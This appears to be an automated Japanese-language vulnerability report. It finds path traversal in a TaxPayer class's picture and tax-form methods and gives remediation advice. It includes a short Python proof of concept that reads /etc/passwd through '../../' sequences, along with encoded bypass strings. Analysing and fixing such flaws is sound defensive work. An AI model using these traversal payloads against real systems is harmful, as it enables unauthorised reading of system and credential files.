# Analysis Report

![中高信頼度](https://img.shields.io/badge/信頼度-中高-orange) **信頼度スコア: 80**

## 脆弱性タイプ

- `LFI`

## PAR Policy Analysis

### Principals (データ源)

- **ユーザー入力**: Untrusted
  - Context: hack.py テスト
  - Risk Factors: 改竄可能, ディレクトリ・トラバーサル

### Actions (セキュリティ制御)

- **get_prof_picture**: Missing
  - Function: ファイルパス検証
  - Weaknesses: 入力バリデーション不在, パス正規化不足
  - Bypass Vectors: ../../, %2e%2e%2f,  
- **get_tax_form_attachment**: Missing
  - Function: ファイルパス検証
  - Weaknesses: 入力バリデーション不在, パス正規化不足
  - Bypass Vectors: ../../, %2e%2e%2f,  

### Resources (操作対象)

- **任意ファイル読み込み**: Critical
  - Operation: read
  - Protection: 

## 詳細解析

hack.py のテストケースから、TaxPayer クラスの get_prof_picture および get_tax_form_attachment メソッドがユーザー入力を適切に検証せずにファイル操作を行っていることが分かります。このため、"../../" を含むパス・トラバーサルシーケンスを使用してシステム上の任意ファイル（例：/etc/passwd）を読み取る LFI 攻撃が可能です。

## PoC（概念実証コード）

```text
# proof of concept
from code import TaxPayer
# Prof pic 関数で /etc/passwd を読み取る
tp = TaxPayer('user','pass')
content = tp.get_prof_picture('../../../../etc/passwd')
print(content)
# Tax form 関数でも同様
import os
base_dir = os.path.dirname(os.path.abspath(__file__)) + '/'
content2 = tp.get_tax_form_attachment(base_dir + '../../../../etc/passwd')
print(content2)
```

## 修復ガイダンス

### TaxPayer.get_prof_picture

- **Required**: ファイルパスの正規化とホワイトリスト検証
- **Guidance**: os.path.realpath で正規化し、許可されたディレクトリ配下のみアクセスを許可する
- **Priority**: high

### TaxPayer.get_tax_form_attachment

- **Required**: ファイルパスの正規化とホワイトリスト検証
- **Guidance**: 同様に realpath を使用し、攻撃パスを排除する
- **Priority**: high

## 解析ノート

テストコード hack.py では get_prof_picture と get_tax_form_attachment にユーザー入力をそのまま渡しており、c.TaxPayer 側にパスバリデーションが存在しない。../../ によるパストラバーサル攻撃が可能。

